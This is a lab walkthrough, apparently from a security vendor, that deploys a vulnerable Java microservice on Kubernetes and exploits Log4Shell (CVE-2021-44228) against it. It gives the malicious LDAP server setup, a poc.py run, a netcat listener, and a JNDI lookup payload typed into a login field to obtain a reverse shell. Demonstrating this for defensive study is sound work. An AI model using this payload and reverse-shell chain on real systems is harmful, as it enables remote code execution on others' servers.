### Deploy Log4j sample application

Deploying a sample Java microservice on namespace java-ms

```
kubectl create ns java-ms
```

```
kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml -n java-ms  
```

Get external IP to surf the application:

```
kubectl -n java-ms get service java-ms-svc | awk '{print $4}'
```

Make sure the application is up and running.
![](https://i.imgur.com/615Fooi.png)

### Exploiting Log4j vulnerability

**Step 1:** Deploying malicious ldap server on namespace java-ms

```
kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s-ldap.yaml -n java-ms
```

Check pods and services running

```
kubectl get po,svc -n java-ms
```

Output:

```
NAME                           READY   STATUS    RESTARTS   AGE
pod/java-ms-56b9c47579-8k2xc   1/1     Running   0          6m48s
pod/nc-pod-679c75d5b7-hcwh8    1/1     Running   0          104s

NAME                  TYPE           CLUSTER-IP     EXTERNAL-IP    PORT(S)                                        AGE
service/java-ms-svc   LoadBalancer   10.88.9.132    34.136.7.141   80:30753/TCP                                   7m16s
service/nc-svc        LoadBalancer   10.88.13.152   34.68.190.28   4444:31515/TCP,8000:31247/TCP,1389:31121/TCP   2m28s
```

**Step 2:** Execute into the LDAP server pod

```
kubectl exec -it nc-pod-679c75d5b7-hcwh8 -n java-ms -- bash
```

Note: Change nc-pod-679c75d5b7-hcwh8 to your pod name.

**Step 3:** Run command inside the pod

Note: userip → external IP of the nc-svc

```
python3 poc.py --userip 34.68.190.28 --webport 8000 --lport 4444
```

Note: Replace 34.68.190.28 with your external IP of the service nc-svc

Output:

```
root@nc-pod-679c75d5b7-hcwh8:/poc# python3 poc.py --userip 34.68.190.28 --webport 8000 --lport 4444

[!] CVE: CVE-2021-44228

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://34.68.190.28:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
```

**Step 4:** Open another terminal and execute into the netcat pod nc-pod-679c75d5b7-4gkjl to listen for reverse shell connection

Note: Here we are using the same pod for the LDAP server and netcat

```
kubectl exec -it nc-pod-679c75d5b7-hcwh8 -n java-ms -- bash
```

Run the below command inside the pod nc-pod-679c75d5b7-4gkjl to listen for reverse shell

```
nc -lvnp 4444
```

Output:

```
root@nc-pod-679c75d5b7-4gkjl:/poc# nc -lvnp 4444
Listening on 0.0.0.0 4444
```

**Step 5:** Get external IP to surf the application:

```
kubectl -n java-ms get service java-ms-svc | awk '{print $4}'
```

Type ${jndi:ldap://34.68.190.28:1389/a} in username field and click Login
![](https://i.imgur.com/l6gv5VO.png)

Note: 34.68.190.28 replace with your nc-svc external IP

**Step 6:** Check netcat pod `nc-pod-679c75d5b7-4gkjl`. You will get a reverse shell to java pod.
![](https://i.imgur.com/WTVj3cU.png)

Note: Try hostname command, you can see hostname is the name of the java microservice pod.

Now we got the reverse shell to the java microservice pod from the netcat pod using log4j vulnerability.


